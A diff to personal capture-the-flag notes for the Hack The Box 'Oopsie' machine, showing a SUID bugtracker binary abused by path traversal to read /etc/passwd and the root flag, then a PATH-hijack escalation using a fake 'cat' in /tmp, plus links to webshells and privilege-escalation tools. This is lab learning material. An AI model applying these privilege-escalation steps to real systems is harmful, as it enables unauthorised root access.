@@ -436,6 +436,122 @@ We observe that user robert is part of the group bugtracker. Let's try to see if
 find / -group bugtracker 2>/dev/null 
 ```
 
+```
+robert@oopsie:/tmp$ /usr/bin/bugtracker
+/usr/bin/bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 1234
+1234
+---------------
+
+cat: /root/reports/1234: No such file or directory  ========================> cat:cat:cat:cat:cat:cat:cat:cat:cat:cat:cat:
+
+robert@oopsie:/tmp$ /usr/bin/bugtracker
+/usr/bin/bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: ../../../../../etc/passwd
+../../../../../etc/passwd
+---------------
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+robert:x:1000:1000:robert:/home/robert:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+
+*** stack smashing detected ***: <unknown> terminated
+Aborted (core dumped)
+robert@oopsie:/tmp$ /usr/bin/bugtracker
+/usr/bin/bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: ../../root/root.txt
+../../root/root.txt
+---------------
+
+af13b0bee69f8a877c3faf667f7beacf
+
+robert@oopsie:/tmp$
+```
+
+
+
+
+OR 
+
+
+
+We will run the application to observe how it behaves:The tool is accepting user input as a name of the file that will be read using the cat command, however, itdoes not specifies the whole path to file cat and thus we might be able to exploit this.We will navigate to /tmp directory and create a file named cat  with the following content
+
+We will then set the execute privileges:
+```
+chmod +x cat
+```
+
+in order to exploit this we can add the /tmp directory to the PATH environmental variable.
+
+```note
+PATH is an environment variable on Unix-like operating systems, DOS, OS/2, andMicrosoft Windows, specifying a set of directories where executable programs arelocated.
+```
+
+export PATH=/tmp:$PATH
+
+
+Finally execute the bugtracker from /tmp directory
+
+
+the special permission for the user accesslevel has a single function: A file with SUID always executes as the user who owns thefile, regardless of the user passing the command. If the file owner doesn't haveexecute permissions, then use an uppercase S here.
+
+
+```note
+SUID : Set owner User ID
+```
+
+
+
+What is the name of the executable being called in an insecure manner?  ==> cat 
+
+
+
+
+
 
 https://github.com/BlackArch/webshells
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
@@ -451,5 +567,7 @@ https://www.hackthebox.com/achievement/machine/313810/287
 
 to install winpeas ======> https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
 
+
+https://gtfobins.github.io/#+suid
 
 why python -m server.http ????? why not install it from github or something ?? 
